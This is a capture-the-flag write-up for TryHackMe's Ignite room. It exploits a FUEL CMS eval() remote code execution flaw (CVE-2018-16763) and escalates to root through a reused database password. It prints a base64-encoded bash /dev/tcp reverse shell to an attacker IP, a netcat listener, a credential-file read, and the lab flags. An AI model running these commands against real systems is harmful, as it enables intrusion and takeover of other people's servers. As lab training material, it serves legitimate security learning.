# Ignite — TryHackMe Write-Up

**Author:** obada  
**Date:** 2026-03-21  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**CVE:** CVE-2018-16763  

---

## Summary

A web server running FUEL CMS 1.4.1 — an outdated PHP-based CMS — was found vulnerable to an unauthenticated Remote Code Execution (RCE) vulnerability via an unsanitized `eval()` call. Initial access was achieved as `www-data`, and privilege escalation to `root` was accomplished through password reuse found in the CMS database configuration file.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sCV -O -Pn -o nmap-result.nmap 10.114.144.112
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 80/tcp | open | http | Apache httpd 2.4.18 (Ubuntu) |

Key observations:
- Only port 80 is exposed — the entire attack surface is the web application.
- `robots.txt` disallows `/fuel/` — this is the CMS admin panel.
- The page title explicitly identifies the CMS: **FUEL CMS**.
- Apache 2.4.18 on Ubuntu — an older version, likely from Ubuntu 16.04.

---

## Enumeration

Navigating to `http://10.114.144.112` confirmed a default FUEL CMS installation. The welcome page itself disclosed the version: **FUEL CMS 1.4.1**, and even provided the default credentials.

The admin panel at `/fuel` was accessible using:
- **Username:** `admin`
- **Password:** `admin`

---

## Exploitation — CVE-2018-16763

### Understanding the Vulnerability

FUEL CMS 1.4.1 contains an **unauthenticated RCE** vulnerability in the `pages` controller. The `filter` parameter passed to `/fuel/pages/select/` is fed directly into PHP's `eval()` function without sanitization:

```php
// Simplified vulnerable code inside Pages.php
eval('$query_result = ' . $filter . ';');
```

Because user input is evaluated as PHP code, an attacker can inject `system()` calls to execute arbitrary OS commands — no authentication required.

### Exploit Script

Using `searchsploit`, a Python exploit was identified:

```bash
searchsploit fuel cms
searchsploit -m linux/webapps/47138.py
```

The original script was written for Python 2. The following modifications were required to run it under Python 3:

| Issue | Fix |
|-------|-----|
| `raw_input()` | → `input()` |
| `urllib.quote()` | → `urllib.parse.quote()` |
| Missing `r = requests.get()` | Added after removing proxy config |
| Hardcoded `url` | → Changed to target IP |

### Confirming RCE

```
cmd: id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Connectivity to the attacker machine was verified via ICMP:

```
cmd: ping -c 1 <ATTACKER_IP>
```

Confirmed via `tcpdump` on `tun0`.

### Reverse Shell

Due to special character encoding issues with the direct reverse shell payload, a base64-encoded approach was used.

**Step 1 — Encode the payload on the attacker machine:**

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi41Ni80NDQ0IDA+JjEK
```

**Step 2 — Start a listener:**

```bash
nc -lvnp 4444
```

**Step 3 — Execute via the exploit:**

```
cmd: echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi41Ni80NDQ0IDA+JjEK | base64 -d | bash
```

Reverse shell received as `www-data`.

### Shell Stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## User Flag

```bash
cat /home/www-data/flag.txt
```

```
6470e394cbf6dab6a91682cc8585059b
```

---

## Privilege Escalation — Password Reuse

### Enumeration

Standard PrivEsc checks were performed. SUID binaries revealed nothing immediately exploitable. The kernel version was noted for reference. Attention shifted to application configuration files.

FUEL CMS, built on CodeIgniter, stores database credentials in a predictable location:

```bash
cat /var/www/html/fuel/application/config/database.php
```

**Credentials found:**

```
username: root
password: mememe
```

### Escalation

A common real-world weakness: developers reusing the database password as the system account password.

```bash
su root
# Password: mememe
```

Access granted.

---

## Root Flag

```bash
cat /root/root.txt
```

```
b9bbcb33e11b80be759c4e844862482d
```

---

## Attack Chain

```
Nmap → FUEL CMS 1.4.1 identified
  ↓
CVE-2018-16763 → Unauthenticated RCE via eval()
  ↓
Base64-encoded reverse shell → www-data
  ↓
database.php → password: mememe
  ↓
su root → Rooted
```

---

## Key Takeaways

**On the vulnerability:** `eval()` evaluates a string as executable code at runtime. Developers sometimes use it to avoid writing complex parsers, trading security for convenience. When user-controlled input reaches `eval()` without sanitization, the attacker effectively has a PHP interpreter — and from there, `system()` provides a direct path to OS command execution.

**On the escalation:** Password reuse between application configuration and system accounts is a persistent and underestimated risk. A database password stored in a world-readable config file becomes a master key if the same string is used elsewhere.

**On exploit adaptation:** Public exploits are rarely plug-and-play. Understanding the code — its assumptions, its Python version, its proxy configuration — is what separates someone who runs tools from someone who understands them.

---

*— XENOS*
